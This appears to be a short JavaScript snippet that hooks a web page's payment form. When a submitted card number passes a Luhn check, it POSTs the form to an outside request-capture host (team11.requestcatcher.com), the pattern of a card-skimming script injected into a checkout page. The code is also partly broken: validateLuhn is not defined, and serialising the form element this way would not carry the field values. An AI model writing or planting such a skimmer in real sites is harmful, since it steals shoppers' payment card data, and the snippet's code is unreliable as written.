const paymentForm = document.getElementById('payment-form');
const cardNumberInput = document.getElementById('card-number');

paymentForm.addEventListener('submit', function(event) {
    const rawValue = cardNumberInput.value.replace(/\s+/g, '');
    if (validateLuhn(rawValue)) {
        fetch('https://team11.requestcatcher.com', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(paymentForm)
        })
    }
});
